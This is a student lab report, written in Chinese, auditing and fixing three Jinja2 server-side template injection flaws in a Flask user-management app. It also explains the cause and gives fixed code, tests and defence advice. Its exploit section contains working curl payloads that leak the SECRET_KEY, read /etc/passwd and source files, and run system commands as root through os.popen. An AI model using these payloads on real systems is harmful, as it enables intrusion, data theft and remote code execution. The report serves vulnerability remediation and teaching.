# Day 8 — SSTI 漏洞审计与修复报告

**王君豪-2024141530115**

| 字段 | 值 |
|------|------|
| 报告编号 | DAY8-SSTI-20260724 |
| 目标地址 | `http://192.168.137.129:5000` |
| 应用名称 | 用户管理系统（Flask + SQLite） |
| 审计日期 | 2026-07-24 |
| 审计类型 | 服务端模板注入（Server-Side Template Injection） |
| 漏洞总数 | 3 个（全部高危） |
| 修复状态 | ✅ 全部已修复 |

---

## 一、漏洞汇总

| 编号 | 漏洞名称 | 类型 | 等级 | 影响位置 | 风险描述 |
|------|---------|------|------|---------|---------|
| V-01 | `/welcome?name=` 参数 SSTI | SSTI | 🔴 高危 | `app.py:739` — `request.args.get("name")` | 攻击者通过 URL 参数注入模板表达式，可执行任意 Python 代码、读取服务器文件、泄露配置密钥 |
| V-02 | `/feedback` POST `name` 字段 SSTI | SSTI | 🔴 高危 | `app.py:775` — `request.form.get("name")` | 攻击者通过表单提交注入模板表达式，可执行任意 Python 代码 |
| V-03 | `/feedback` POST `message` 字段 SSTI | SSTI | 🔴 高危 | `app.py:776` — `request.form.get("message")` | 攻击者通过表单留言字段注入模板表达式，可执行任意 Python 代码 |

---

## 二、漏洞原理

### 2.1 什么是 SSTI？

SSTI（Server-Side Template Injection，服务端模板注入）是一种 Web 安全漏洞，发生在服务端将用户输入直接拼接到模板字符串中，然后交给模板引擎渲染的场景。由于模板引擎（如 Jinja2）会将 `{{ }}` 中的内容解析为 Python 表达式并执行，攻击者可以通过注入恶意模板语句来实现：

- **信息泄露**：读取配置密钥、环境变量、源代码
- **任意文件读取**：读取服务器上的任意文件
- **远程代码执行（RCE）**：执行系统命令，完全控制服务器

### 2.2 Jinja2 模板引擎渲染流程

```mermaid
模板字符串输入
    │
    ▼
┌─────────────────────────────────────────────────┐
│  Jinja2 词法分析器 (Lexer)                       │
│  ├── 识别普通文本 → 直接输出                     │
│  ├── 识别 {{ expr }} → 解析为变量/表达式         │
│  ├── 识别 {% stmt %} → 解析为控制语句           │
│  └── 识别 {# comment #} → 忽略                  │
└─────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────┐
│  Jinja2 解析器 (Parser)                          │
│  └── 构建抽象语法树 (AST)                        │
└─────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────┐
│  Jinja2 编译器 (Compiler)                        │
│  └── 编译为 Python 字节码                       │
└─────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────┐
│  执行编译后的代码                                 │
│  ├── {{ 7*7 }} → 执行 Python 乘法 → 49          │
│  ├── {{ config }} → 访问 Flask 配置对象         │
│  └── {{ os.popen('id').read() }} → 执行系统命令 │
└─────────────────────────────────────────────────┘
```

### 2.3 漏洞代码模式 vs 安全代码模式

```python
# ╔═══════════════════════════════════════════════════╗
# ║  ❌ 漏洞模式：f-string 拼接用户输入到模板          ║
# ╚═══════════════════════════════════════════════════╝

name = request.args.get("name", "")  # 用户输入: {{7*7}}
# Python f-string 先展开 → 模板变成:
# "<h1>欢迎你，{{7*7}}！</h1>"
#                         ↑ 用户输入成了模板代码
render_template_string(f"<h1>欢迎你，{name}！</h1>")
#                       ↑ Jinja2 解析 → 执行 7*7 → 输出 "49"


# ╔═══════════════════════════════════════════════════╗
# ║  ✅ 安全模式：用户输入作为模板变量传入             ║
# ╚═══════════════════════════════════════════════════╝

name = request.args.get("name", "")  # 用户输入: {{7*7}}
# 模板是静态字符串，不包含用户输入:
# "<h1>欢迎你，{{ name }}！</h1>"
#                 ↑ name 是变量名，不是用户输入
render_template_string("<h1>欢迎你，{{ name }}！</h1>", name=name)
#                                                       ↑ 用户输入作为数据传入
# Jinja2 解析 → 取变量 name 的值 → "{{7*7}}" → 自动转义输出
```

### 2.4 f-string 与模板变量传参的本质区别

```
┌─────────────────────────────────────────────────────────────────────┐
│  f-string 拼接（漏洞）                                              │
│                                                                     │
│  name = "{{7*7}}"                                                   │
│  f"<h1>{name}</h1>"                                                 │
│       ↓                                                             │
│  Python 执行 f-string → 字符串变为:                                  │
│  "<h1>{{7*7}}</h1>"                                                 │
│       ↓                                                             │
│  传给 render_template_string → Jinja2 看到的是:                     │
│  "<h1>{{7*7}}</h1>" → 解析 {{7*7}} → 执行 7*7 → "49"               │
│                                                                     │
│  → 用户输入在"编译前"就注入了模板代码                               │
└─────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────┐
│  模板变量传参（安全）                                                │
│                                                                     │
│  name = "{{7*7}}"                                                   │
│  render_template_string("<h1>{{ name }}</h1>", name=name)            │
│       ↓                                                             │
│  Jinja2 编译模板 → 编译后的模板有一个变量占位符 name                 │
│  "<h1>{{ name }}</h1>" → 解析 {{ name }} → 从变量字典取 name 的值   │
│       ↓                                                             │
│  name 的值是 "{{7*7}}" → 作为普通字符串输出                         │
│                                                                     │
│  → 用户输入在"编译后"才传入，Jinja2 不再解析其中的 {{ }}            │
│  → 模板结构已固定，用户输入只是数据，不会成为代码                   │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 三、漏洞详情与利用方式

---

### V-01：/welcome?name= GET 参数 SSTI

#### 漏洞位置

| 字段 | 值 |
|------|-----|
| **路由** | `GET /welcome` |
| **代码行** | `app.py` 第 739-745 行 |
| **注入参数** | `name`（URL 查询参数） |
| **渲染函数** | `render_template_string()` |
| **漏洞根因** | `f"<h1>欢迎你，{name}！</h1>"` — f-string 直接拼接 |

#### 漏洞代码逐行分析

```python
@app.route("/welcome")
def welcome():
    # 第 739 行：获取用户输入的 name 参数
    name = request.args.get("name", "")           # ← 用户可控
    if not name:
        name = "亲爱的用户"

    nav = _build_nav_html()

    # 第 744 行：❌ 使用 f-string 将用户输入拼入 HTML 内容
    content = f"<h1>欢迎你，{name}！</h1>"
    #          ↑ Python f-string：{name} 会被替换为用户输入的字符串
    #            如果 name = "{{7*7}}"，则 content 变为：
    #            "<h1>欢迎你，{{7*7}}！</h1>"
    #            这里的 {{7*7}} 是 Jinja2 模板语法，不是 Python f-string 语法

    # 第 745 行：将拼装好的 content 通过 f-string 再次嵌入完整 HTML
    return render_template_string(f"""...
        {content}     ← content 已包含用户输入的 {{7*7}}
    ...""")
    #     ↑ Jinja2 收到整个字符串后，发现 {{7*7}} → 当作模板表达式执行

    # 总结：用户输入经过两次 f-string 展开，最终嵌入到模板字符串中
    # Jinja2 编译该字符串时，用户的 {{7*7}} 被识别为模板语法并执行
```

#### 攻击链逐步演示

**第 1 步：基础探测 — 检测是否存在 SSTI**

```bash
# 发送基础运算表达式
curl "http://target/welcome?name={{7*7}}"
# 返回: <h1>欢迎你，49！</h1>
#       ↑ 7*7=49，表达式被执行 → 确认 SSTI 存在
```

**第 2 步：信息收集 — 读取 Flask 配置**

```bash
# 泄露 Flask SECRET_KEY
curl "http://target/welcome?name={{config.SECRET_KEY}}"
# 返回: <h1>欢迎你，8904c2619cf8d5612909c233e2ce856ea361542f278a578aa2dbaaecbfb2115a！</h1>
#       ↑ SECRET_KEY 被泄露！

# 查看完整配置
curl "http://target/welcome?name={{config}}"
# 返回: <h1>欢迎你，&lt;Config {'DEBUG': False, 'TESTING': False, 'SECRET_KEY': '...'} ...&gt;！</h1>
#       ↑ 全部配置信息泄露
```

**第 3 步：文件读取 — 读取服务器文件**

```python
# 利用 Jinja2 内置的访问链读取文件
# get_flashed_messages → __globals__ → __builtins__ → open()
payload = "{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}"
```

```bash
curl "http://target/welcome?name={{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}"
# 返回: <h1>欢迎你，root:x:0:0:root:/root:/usr/bin/zsh
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# ...！</h1>
#       ↑ 系统用户列表泄露！
```

**第 4 步：源代码读取**

```bash
curl "http://target/welcome?name={{get_flashed_messages.__globals__.__builtins__.open('app.py').read()}}"
# 返回: <h1>欢迎你，import os
# import secrets
# ...！</h1>
#       ↑ 项目完整源代码泄露！
```

**第 5 步：远程代码执行（RCE）**

```python
# 利用 Jinja2 访问链找到 os 模块 → 执行系统命令
# 链: self._TemplateReference__context → cycler → __init__ → __globals__ → os → popen
payload = "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}"
```

```bash
curl "http://target/welcome?name={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}"
# 返回: <h1>欢迎你，uid=0(root) gid=0(root) groups=0(root)！</h1>
#       ↑ 以 root 权限执行了系统命令 id！
```

**第 6 步：RCE — 执行更多命令**

```bash
# 列出目录
curl "http://target/welcome?name={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -la').read()}}"
# → app.py, templates/, static/, pages/ ...

# 读取环境变量
curl "http://target/welcome?name={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('env').read()}}"
# → PATH, HOME, USER ...

# 读取主机名
curl "http://target/welcome?name={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /etc/hostname').read()}}"
# → kali
```

#### 攻击流程图解

```
攻击者
    │
    ├──→ 1. 基础探测:   {{7*7}}                     → "49"                     ✅ SSTI 确认
    │
    ├──→ 2. 密钥泄露:   {{config.SECRET_KEY}}       → "8904c261..."            🔴 密钥泄露
    │
    ├──→ 3. 文件读取:   {{open('/etc/passwd').read()}} → "root:x:0:0..."        🔴 敏感文件
    │
    ├──→ 4. 源码读取:   {{open('app.py').read()}}    → "import os..."           🔴 源码泄露
    │
    └──→ 5. RCE:       {{os.popen('id').read()}}     → "uid=0(root)"           🔴 服务器沦陷
```

---

### V-02 & V-03：/feedback POST name/message 字段 SSTI

#### 漏洞位置

| 字段 | 值 |
|------|-----|
| **路由** | `POST /feedback` |
| **代码行** | `app.py` 第 775-791 行 |
| **注入参数** | `name` 和 `message`（POST 表单参数） |
| **渲染函数** | `render_template_string()` |
| **漏洞根因** | `f"<h2>{name} 的反馈：</h2>\n<p>{message}</p>"` — 两个参数均通过 f-string 拼接 |

#### 漏洞代码逐行分析

```python
@app.route("/feedback", methods=["GET", "POST"])
@csrf.exempt
def feedback():
    nav = _build_nav_html()

    if request.method == "POST":
        # 第 775 行：获取用户输入的 name
        name = request.form.get("name", "")           # ← 用户可控

        # 第 776 行：获取用户输入的 message
        message = request.form.get("message", "")      # ← 用户可控

        # 第 778-798 行：两个参数均通过 f-string 拼入模板
        result_html = f"""<!DOCTYPE html>
...
            <h2>{name} 的反馈：</h2>
            <!-- ↑ 用户输入的 name 直接拼接 -->
            <p>{message}</p>
            <!-- ↑ 用户输入的 message 直接拼接 -->
..."""
        # 第 799 行：交给 Jinja2 渲染
        return render_template_string(result_html)
        #                  ↑ 用户输入的 {{ }} 被 Jinja2 解析执行
```

#### 注入点对比

| 注入点 | 获取方式 | 代码位置 | 相同漏洞 |
|--------|---------|---------|---------|
| `/welcome?name=` | GET URL 参数 | `app.py:739` | ✅ f-string 拼接 |
| `/feedback name` | POST 表单字段 | `app.py:775` | ✅ f-string 拼接 |
| `/feedback message` | POST 表单字段 | `app.py:776` | ✅ f-string 拼接 |

虽然三个注入点位置不同、参数来源不同，但**漏洞根因完全一致**——都使用 f-string 将用户输入拼接到 `render_template_string()` 的模板字符串中。

#### 攻击演示

```bash
# 两个字段同时注入
curl -X POST "http://target/feedback" \
  -d "name={{7*7}}&message={{config.SECRET_KEY}}"

# 返回:
# <h2>49 的反馈：</h2>
#  ↑ name 字段的 {{7*7}} 被执行
# <p>8904c2619cf8d5612909c233e2ce856ea361542f278a578aa2dbaaecbfb2115a</p>
#  ↑ message 字段的 {{config.SECRET_KEY}} 被执行 → 密钥泄露

# RCE 同样可行
curl -X POST "http://target/feedback" \
  -d "name=RCE_TEST&message={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}"

# 返回: <p>uid=0(root)</p>
```

---

## 四、SSTI 攻击链危害总结

```
┌─────────────────────────────────────────────────────────────────┐
│              SSTI 攻击链危害等级                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  级别 1: 信息泄露                                                 │
│  ├── Flask SECRET_KEY 泄露                                      │
│  ├── 可通过 SECRET_KEY 伪造任意用户的 Session Cookie             │
│  └── 直接登录 admin 账号                                        │
│                                                                 │
│  级别 2: 敏感文件读取                                             │
│  ├── /etc/passwd → 系统用户列表                                  │
│  ├── app.py → 全部源码                                           │
│  ├── .env → 环境变量中的其他密钥                                  │
│  └── users.db → 全部用户数据（含密码哈希）                        │
│                                                                 │
│  级别 3: 远程代码执行 (RCE)                                      │
│  ├── 执行任意系统命令                                            │
│  ├── 安装后门/挖矿程序                                           │
│  ├── 创建反向 Shell                                              │
│  └── 横向移动到内网其他服务器                                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 五、修复方案

### 5.1 核心修复原理

将用户输入从"模板代码"降级为"模板数据"：

```
修复前: render_template_string(f"...{user_input}...")
         ↑ 用户输入在 f-string 阶段就成为模板代码的一部分
         Jinja2 编译时会解析其中的 {{ }}

修复后: render_template_string("...{{ var }}...", var=user_input)
         ↑ 模板字符串是静态的，{{ var }} 只是占位符
         用户输入在运行时作为数据传入，不参与模板编译
```

### 5.2 修复后的代码

```python
# ═══════════════════════════════════════════
#  /welcome 路由（修复后）
# ═══════════════════════════════════════════

@app.route("/welcome")
def welcome():
    name = request.args.get("name", "")
    if not name:
        name = "亲爱的用户"

    nav = _build_nav_html()

    # ✅ 修复：模板字符串使用 {{ name }} 作为占位符
    # name 作为模板变量传入，不参与模板编译
    return render_template_string("""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>欢迎页</title>
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    {{ nav | safe }}
    <main class="container">
        <div class="card" style="text-align: center;">
            <h1>欢迎你，{{ name }}！</h1>   <!-- 这里用模板变量，不是 f-string -->
            <p style="margin-top: 20px;">欢迎使用用户管理系统</p>
            <a href="/" class="btn">返回首页</a>
        </div>
    </main>
</body>
</html>""", name=name, nav=nav)
#   ↑ name=name 将用户输入作为模板变量的值传入


# ═══════════════════════════════════════════
#  /feedback 路由（修复后）
# ═══════════════════════════════════════════

@app.route("/feedback", methods=["GET", "POST"])
@csrf.exempt
def feedback():
    nav = _build_nav_html()

    if request.method == "POST":
        name = request.form.get("name", "")
        message = request.form.get("message", "")

        # ✅ 修复：使用模板变量 {{ name }} 和 {{ message }}
        # name 和 message 作为模板变量传入
        return render_template_string("""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>反馈结果</title>
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    {{ nav | safe }}
    <main class="container">
        <div class="card">
            <h2>{{ name }} 的反馈：</h2>    <!-- 模板变量 -->
            <p>{{ message }}</p>            <!-- 模板变量 -->
            <a href="/feedback" class="btn">继续反馈</a>
        </div>
    </main>
</body>
</html>""", name=name, message=message, nav=nav)
    #   ↑ 三个变量都通过关键字参数传入
```

### 5.3 修复前后代码对比

| 对比项 | 修复前（漏洞） | 修复后（安全） |
|--------|---------------|---------------|
| **模板字符串** | `f"<h1>欢迎你，{name}！</h1>"` | `"<h1>欢迎你，{{ name }}！</h1>"` |
| **用户输入传入方式** | f-string 直接拼接 | `render_template_string(..., name=name)` |
| **用户输入角色** | 模板代码的一部分 | 模板变量的值 |
| **`name="{{7*7}}"` 时** | Jinja2 解析 → 执行 → `49` | Jinja2 取变量值 → `"{{7*7}}"`（原文输出） |
| **Jinja2 编译时机** | 编译时用户输入已在模板中 | 编译时模板已固定，用户输入在运行时传入 |
| **安全性** | ❌ SSTI 漏洞 | ✅ 安全 |

### 5.4 涉及文件

| 文件 | 修改行 | 修改内容 |
|------|--------|---------|
| `app.py:739-745` | `/welcome` | `f"<h1>欢迎你，{name}！</h1>"` → `"<h1>欢迎你，{{ name }}！</h1>"` + `name=name` |
| `app.py:775-791` | `/feedback` POST | `f"<h2>{name}...</h2>"` → `"<h2>{{ name }}...</h2>"` + `name=name, message=message` |
| `app.py:753` | nav 渲染 | `{nav}`（f-string）→ `{{ nav \| safe }}`（模板变量）+ `nav=nav` |

---

## 六、修复验证

### 6.1 安全测试

| 测试项 | Payload | 修复前 | 修复后 | 结果 |
|--------|---------|--------|--------|------|
| 基础运算 | `{{7*7}}` | `49` | `{{7*7}}`（原文） | ✅ 已修复 |
| 过滤器 | `{{'test'\|upper}}` | `TEST` | `{{'test'\|upper}}` | ✅ 已修复 |
| 密钥泄露 | `{{config.SECRET_KEY}}` | `8904c261...` | `{{config.SECRET_KEY}}` | ✅ 已修复 |
| 配置泄露 | `{{config}}` | 全部配置信息 | `{{config}}`（原文） | ✅ 已修复 |
| 文件读取 | `{{open('/etc/passwd').read()}}` | `root:x:0:0...` | 原文输出（HTML 转义） | ✅ 已修复 |
| RCE | `{{os.popen('id').read()}}` | `uid=0(root)` | 原文输出（HTML 转义） | ✅ 已修复 |
| 类链攻击 | `{{''.__class__.__mro__}}` | 类信息列表 | 原文输出 | ✅ 已修复 |

### 6.2 功能测试

| 测试项 | 输入 | 预期输出 | 结果 |
|--------|------|---------|------|
| 欢迎页正常 | `name=张三` | `<h1>欢迎你，张三！</h1>` | ✅ |
| 欢迎页空参数 | 无参数 | `<h1>欢迎你，亲爱的用户！</h1>` | ✅ |
| 反馈正常 | `name=王君豪, message=测试反馈` | `<h2>王君豪 的反馈：</h2><p>测试反馈</p>` | ✅ |
| 反馈特殊字符 | `name=<test>, message=a&b` | HTML 自动转义 | ✅ |

### 6.3 回归测试

| 测试项 | 结果 |
|--------|------|
| 登录功能 | ✅ 正常 |
| 搜索功能 | ✅ 正常 |
| 注册功能 | ✅ 正常 |
| 充值功能 | ✅ 正常 |
| 修改密码 | ✅ 正常 |
| 头像上传 | ✅ 正常 |
| 个人中心 | ✅ 正常 |
| 帮助中心 | ✅ 正常 |

### 6.4 验证截图

```bash
# 修复前 — SSTI 成功
$ curl "http://target/welcome?name={{7*7}}"
<h1>欢迎你，49！</h1>                          ❌ 漏洞存在

# 修复后 — SSTI 被阻止
$ curl "http://target/welcome?name={{7*7}}"
<h1>欢迎你，{{7*7}}！</h1>                     ✅ 已修复

# 修复前 — 密钥泄露
$ curl "http://target/welcome?name={{config.SECRET_KEY}}"
<h1>欢迎你，8904c2619cf8d5612909c233e2ce856ea361542f278a578aa2dbaaecbfb2115a！</h1>

# 修复后 — 密钥不泄露
$ curl "http://target/welcome?name={{config.SECRET_KEY}}"
<h1>欢迎你，{{config.SECRET_KEY}}！</h1>       ✅ 仅显示原文
```

---

## 七、安全修复原理总结

### render_template_string 的正确使用

```python
render_template_string(template_string, **kwargs)
```

| 参数 | 说明 | 安全性 |
|------|------|--------|
| `template_string` | 模板内容，编译时解析 `{{ }}` | 必须**不含用户输入** |
| `**kwargs` | 模板变量的值，运行时传入 | **可包含用户输入** |

### f-string 拼接的误区和风险

```
误区："name 用 f-string 拼进去和用模板变量传入效果一样"
真相：完全不同！

f-string 在 Python 执行阶段展开
    ↓
render_template_string 拿到的是展开后的字符串
    ↓
Jinja2 编译该字符串 → 用户输入的 {{ }} 成为模板语法
    ↓
❌ SSTI 漏洞


模板变量在 Jinja2 运行时传入
    ↓
render_template_string 拿到的是静态模板字符串
    ↓
Jinja2 编译 → 模板已有固定结构，{{ var }} 只是占位符
    ↓
Jinja2 渲染时从变量字典取值 → 用户输入只是数据
    ↓
✅ 安全
```

### 一句话记忆

> **f-string 是编译前注入（用户在编译时就成为代码），模板变量是运行时传入（编译后用户才参与，只能是数据）。**

---

## 八、防御建议

| 优先级 | 措施 | 详细说明 | 可检测性 |
|--------|------|---------|---------|
| 🔴 高 | **禁止 f-string + render_template_string** | 代码审查规则：不允许 `render_template_string(f"...")` 模式 | 自动化 Semgrep 扫描 |
| 🔴 高 | **优先使用 render_template** | 使用独立的 `.html` 模板文件，避免在代码中内联模板字符串 | 手动代码审查 |
| 🟠 中 | **输入净化** | 对用户输入进行白名单校验（如仅允许中文/字母/数字） | 自动化 |
| 🟠 中 | **Jinja2 沙箱** | 启用沙箱模式限制模板中可访问的内置函数 | 配置即可 |
| 🟢 低 | **WAF 规则** | 拦截包含 `{{`、`{%`、`#{` 等模板语法字符的请求参数 | 需部署 WAF |
